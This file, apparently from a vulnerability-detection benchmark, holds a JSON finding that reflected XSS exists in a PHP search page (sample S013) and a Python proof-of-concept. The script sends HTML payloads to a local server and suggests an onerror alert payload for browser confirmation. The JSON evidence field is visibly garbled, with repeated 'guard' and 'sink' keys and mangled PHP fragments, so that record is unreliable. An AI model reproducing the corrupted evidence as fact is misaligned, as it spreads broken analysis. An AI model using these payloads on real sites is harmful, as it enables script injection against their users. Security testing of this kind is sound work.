@@ -1,0 +1,52 @@
+```json
+{"sample_id":"S013","prediction":"vulnerable","vulnerability_type":"XSS","locations":["F01:0003","F01:0013"],"evidence":{"source":"F01:0003：q=q = q=_GET['q'] ?? ''，q 是来自请求的参数，完全可控","flow":"F01:0003 读取后未经任何处理，F01:0013 在HTML正文<p>元素内直接 echo q","guard":"无效：F01:0013无htmlspecialchars等HTML实体编码，未限制<、>、引号等字符","sink":"F01:0013：<p>搜索词：<?phpechoq","guard":"无效：F01:0013 无 htmlspecialchars 等HTML实体编码，未限制<、>、引号等字符","sink":"F01:0013：<p>搜索词：<?php echo q","guard":"无效：F01:0013无htmlspecialchars等HTML实体编码，未限制<、>、引号等字符","sink":"F01:0013：<p>搜索词：<?phpechoq; ?></p> 反射型HTML上下文输出"},"prerequisites":["Web服务器可访问该PHP单页脚本（本地）","攻击者可控制GET参数q","浏览器解析返回HTML"],"missing_context":[],"poc_generated":true,"poc_language":"python3","poc_instructions":"启动本地PHP服务后，先访问普通输入确认基线，再访问带HTML标签的测试输入，人工在浏览器查看是否渲染为元素而非转义文本。HTTP响应体中出现标签字符串不等于浏览器执行脚本，需在浏览器确认页面出现自定义标记（如<b>粗体</b>或<img onerror=alert(document.domain)>弹框）。下面使用127.0.0.1:4280。"}
+```
+
+```python
+#!/usr/bin/env python3
+# 本地最小验证：反射型XSS（HTML正文上下文），目标 http://127.0.0.1:4280/
+import urllib.parse, urllib.request, sys
+
+BASE = "http://127.0.0.1:4280/"
+
+def fetch(q):
+    url = BASE + "?q=" + urllib.parse.quote(q)
+    with urllib.request.urlopen(url, timeout=5) as r:
+        body = r.read().decode("utf-8", "replace")
+        status = r.status
+    return url, status, body
+
+def main():
+    # 普通输入：应作为纯文本显示
+    url1, st1, body1 = fetch("hello")
+    print("[normal] url =", url1)
+    print("[normal] status =", st1)
+    print("[normal] body contains '<p>搜索词：hello</p>' =",
+          "<p>搜索词：hello</p>" in body1)
+
+    # 测试输入：HTML标签是否原样出现在响应正文（说明未编码）
+    payload = "<b>XSS_TEST_MARK</b>"
+    url2, st2, body2 = fetch(payload)
+    print("[test] url =", url2)
+    print("[test] status =", st2)
+    raw = "<b>XSS_TEST_MARK</b>" in body2
+    escaped = "&lt;b&gt;XSS_TEST_MARK&lt;/b&gt;" in body2
+    print("[test] raw HTML tag present =", raw)
+    print("[test] escaped present        =", escaped)
+
+    if raw and not escaped:
+        print("[结论] 响应正文含未编码的HTML标签，存在反射型XSS迹象。")
+        print("[人工确认] 在浏览器打开：", url2)
+        print("           若页面出现加粗的 XSS_TEST_MARK，而不是字面 '<b>XSS_TEST_MARK</b>'，")
+        print("           即确认HTML注入；再用 <img src=x onerror=alert(document.domain)> 观察弹框。")
+        print("           注意：仅响应体出现字符串不代表脚本执行，必须以浏览器渲染为准。")
+    else:
+        print("[结论] 未观察到未编码标签，可能已转义或响应结构不同，请人工核查。")
+
+if __name__ == "__main__":
+    try:
+        main()
+    except Exception as e:
+        print("[error] 无法连接目标，请确认本地PHP服务已在 127.0.0.1:4280 运行：", e)
+        sys.exit(1)
+```
